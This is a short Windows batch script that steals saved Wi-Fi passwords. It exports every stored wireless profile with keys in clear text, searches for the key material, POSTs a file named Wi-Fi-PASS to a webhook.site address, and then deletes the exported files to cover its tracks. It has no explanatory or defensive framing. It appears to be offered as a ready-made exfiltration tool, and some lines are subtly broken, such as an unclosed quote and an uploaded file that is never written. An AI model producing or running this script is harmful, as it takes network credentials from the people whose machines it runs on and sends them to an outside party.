@echo off
cd %temp%
netsh wlan export profile key=clear
powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial
powershell Invoke-WebRequest -Uri https://webhook.site/60bd65ac-65da-42cb-aecb-e875984dc1b1 -Method POST -InFile Wi-Fi-PASS
del Wi-* /s /f /q
exit
